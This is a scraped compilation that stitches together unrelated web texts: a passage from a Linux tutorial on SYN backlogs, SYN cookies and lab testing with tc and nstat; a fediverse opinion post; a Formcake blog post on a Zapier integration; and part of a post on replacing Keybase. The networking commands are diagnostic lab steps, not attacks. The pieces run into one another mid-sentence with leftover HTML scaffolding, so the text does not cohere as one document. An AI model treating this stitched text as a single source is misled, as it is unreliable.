<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>That's the plan, right? A whole new world awaits you on the fediverse, and you are going to make it there! There's something you should know.</p>
<!--more-->
<h2>Welcome to the Fediverse</h2>
<p>Whenever I talk to people in my surroundings about the fediverse and try to convince them to use it, I have a go-to story that I tell. On multiple occasions in the past, there have been real-life events that sparked controversy on Twitter which then responded by banning some public figure or doing something else to upset a portion of the population. In turn, this would lead to either that public figure or a social movement to incite people to leave Twitter and join a safer and more open alternative: the fediverse. As citizens of the fediverse, we would notice a massive influx of new users and a stream of introductory messages on our timelines. Which, in my humble opinion, is always a welcome sight. An interesting observation is that the first message by these new citizens is often a little… "off" if you are used to being on the fediverse.</p>
<p>Allow me to elaborate. The introductory message of Twitter exiles often reads as follows: "Hello all! I am [insert name here], I am going to post messages about [insert multiple topics here]. Who are the people I should follow?".</p>
<p>The message above oozes "Twitter Mentality". To explain what I mean, let me use an analogy.</p>
<h2>The analogy</h2>
<p>Twitter is a metropole. Its users all share the same playing field. If you want to participate, you don't talk, you shout. How else are you going to be heard in a crowd of millions? Once you start shouting, quiet people start to listen. This creates a one-to-many dynamic.</p>
<p>The fediverse is a network of well-connected villages. As part of a village, you get to know people. You talk to people because it's less crowded, there's less competition. It's still a network so you can connect to people multiple villages away with the same ease. But the noise is filtered. You are surrounded by people who share a common interest which is the reason you decided to live in that specific village in the first place, but you still get the network effect and communicate with people outside of the village because you want to, because you can. This creates a one-to-one or on a larger scale, many-to-many dynamic.</p>
<h2>What makes a network social?</h2>
<p>My argument is that a one-to-many network is not a social network, it's broadcasting. Having "influencers" on a network is, if anything, anti-social. This is where I need to go back to that initial message by the Twitter exile. There's no need to announce you are going to talk about a certain topic, just do it. I will not follow you because you are announcing to post messages about a certain topic. Post a message, let's debate and talk about it and if I am truly interested in your opinion and reasonings, only then will I follow you. And don't follow people because many others do; follow them because you want to, because you get the choice.</p>
<p>This is my opinion and I have talked to many sharing the same sentiment. This many-to-many dynamic is what makes the fediverse appealing. You get a Home timeline where you will find posts from people you follow and actually want to hear from. You get a Local Timeline filled with posts from people you don't always know, but it's the same instance/village, so you already share a common ground. And for when you feel like exploring, you get a Known Network timeline filled with all sorts of posts.</p>
<p>You may argue that building this whole narrative around a simple introductory post is flimsy, and I agree. Not everyone's first post is like that, and even if it were, there are different ways of interpreting the content. But it's something I found people can relate to, it's a bridge between two mentalities, two social structures that I can use to introduce the many advantages of the fediverse.</p>
<p>If you would like actually useful information on starting with the fediverse with Mastodon, please have a look at this <a href="https://kevq.uk/how-does-mastodon-work/">blog post by KevQ</a>.</p></div></div>]]>

July 3, 2020 | https://formcake.com/blog/integrating-with-zapier | <a href="https://web.archive.org/web/*/https://formcake.com/blog/integrating-with-zapier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We <em>just</em> launched our integration with Zapier and have some thoughts to share on the process.</p>
<p>If you haven't heard of Zapier then you've probably never been asked to integrate your company’s API to a 3rd party product “as quickly as possible.” Zapier has become the API platform for the web and - as a company who takes in data and sheperds it through to other workflows - it was a no brainer to integrate Formcake with Zapier. Integration was straightforward enough, but still a bit of a journey, so hopefully these details that may interest those looking to do the same and shorten their learning curve a bit.</p>
<p>So what does Zapier ask from its integration partners? And what decisions did we have to make accommodate those requirements? Here is our list of top concerns.</p>
<h2 id="1-authenticating-with-zapier">1) Authenticating with Zapier</h2>
<p>Zapier obviously needs a way to communicate with your app. The two options that we considered were OAuth2 and JTW tokens. We love OAuth2 with all of its control and flexibility. Honestly it would have been a great choice for Zapier. We however ended up choosing JWT instead. With OAuth2's power comes complexity and as a small SaaS app we wanted to keep things simple. Yes, having the user connect Zapier to Formcake would have been a little more straightforward, but we also knew that we did not want to use OAuth2 for our forthcoming user API. This API will allow users to access their data simply and securely and if you have ever had to use OAuth2 for an API where you just want to make a GET request, you many identify with our thinking. In our case, we adopted a new, Zapier-specific JWT strategy that lives alongside our existing JWT auth system.</p>
<p>With our new JWT auth token system, Formcake users can navigate to API Keys, create a Zapier API Key, and plug it into Zapier. They can also see the last time a key was used and can revoke those keys that are no longer needed or have become compromised. This worked particularly well for us because it dovetails nicely into the necessary infrastructure for our user API and we think our users will appreciate the simple process of passing a JTW token with API requests. It will also be extensible should we want to integrate more tightly with any other systems in the future.</p>
<h3 id="creating-your-token-in-formcake">Creating Your Token in Formcake:</h3>

<h3 id="logging-into-formcake">Logging Into Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-key-login.png" alt="Logging into formcake"></p>
<h2 id="2-polling-vs-webhook-trigger">2) Polling vs Webhook Trigger</h2>
<p>When you are setting up your Zapier integration, you have the option to create one of two types of "Triggers". You can either have Zapier regularly poll an endpoint in your API and then propagate any new changes it finds, or you can communicate with Zapier via webhooks, pushing out anything new on your end and triggering an immediate response.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-trigger-types.png" alt="Zapier polling vs webhook trigger options"></p>
<p>Of course for something like a form, the webhook method is critical, since when your form receives a submission you want it to, you know, <em>do</em> something, instead of quietly waiting for Zapier to get in touch. For those considering these options, know that creating a webhook system is not always the right choice. Creating a Polling Trigger is far more simple than creating a Webook Trigger. For data that does not change very often or has a limited set of data, polling can get your integration off the ground much faster and may be you all that you ever need. For Formcake's purposes, we knew that users would want to see something happen in Zapier immediately, especially when first creating and debugging their integration. A form could also have thousands of submissions, making polling simply not an option since Zapier would have to poll all submissions each time, creating a slower and slower process as our users get more and more value out of their forms.</p>
<h2 id="3-enable--disable">3) Enable / Disable</h2>
<p>Note that even with the webhook system in place, where we send data to Zapier instead of Zapier hitting our API, we still need to provide Zapier a way to authenticate with our app beyond simply logging the user in. This is because Zapier requires something else - a way to enable and disable webooks within our app. Zapier asks that you provide <code>/subscribe</code> and <code>/unsubscribe</code> endpoints that will turn your webhooks on and off. The <code>/subscribe</code> endpoint is meant to activate your webhook and also provide a webhook url to send your data to Zapier. This webhook url corresponds to a Zap in Zapier. The <code>/unsubscribe</code> endpoint simply turns off your webhook.</p>
<p>Within Formcake, these endpoints toggle an action's <code>active</code> property and also store the Zapier webhook url. On our own end, we use the <code>active</code> property in our own app frontend so that users can see on both platforms whether a Zap has been successfully connected. Zapier requires unsubscribing so that your app does not send data to Zapier after a Zap has been paused or deleted. Can you imagine the amount of unuseful API requests Zapier would recieve if they did not reserve the right to turn off your app's webhooks?</p>

<p><img src="https://formcake.com/images/blog-posts/zapier-connected-to-action.png" alt="Zapier connected"></p>
<h2 id="4-preform-list-trigger">4) "Preform List" Trigger</h2>
<p>After giving Zapier a way to enable or disable your webhooks, your app also needs to provide a way to pull an example of whatever data your app will send to Zapier. This is accomplished in Zapier by using a Polling Trigger, but one that is not visible to the public and is only meant for other Zapier Triggers to use in order to get a list of information. In Zapier this is called a "Preform List" endpoint and is entirely optional. We would advise those making an integration use this option since it makes your Zapier integration far more useful. For Formcake, this endpoint returns a form's last 5 submissions.</p>

<p><img src="https://formcake.com/images/blog-posts/zapier-preform-list.png" alt="Zapier preform list"></p>
<h2 id="5-marketing-your-integration-beta-to-searchable">5) Marketing Your Integration (Beta to Searchable)</h2>
<p>After you are satisfied with your Zapier integration, you then need to develop a launch strategy in order to get your integration approved. Anyone is allowed to create a private integration but in order to have your integration publicly searchable on Zapier you have to satisfy a couple of requirements. Some of these are practical like providing a support contact so that Zapier can pass along support requests, but the real hurtle is getting 50 users to start using the integration. Zapier gives you access to a link that allows you to invite users to your integration. With this link users can beta test your Zap and you can tweak it to your users needs before submitting it to Zapier.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-share-page.png" alt="Zapier preform list"></p>
<h2 id="next-steps">Next Steps</h2>
<p>Formcake's Zapier integration is currently in beta so go ahead and <a href="https://formcake.com/documentation/actions#zapier-action">try it out</a>! Formcake's free plan nicely syncs up with Zapier's where each allow you 100 free submissions per month. If you have any feedback for the integration, please reach out to us at <a href="mailto:contact@formcake.com">contact@formcake.com</a>.</p>

It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>.
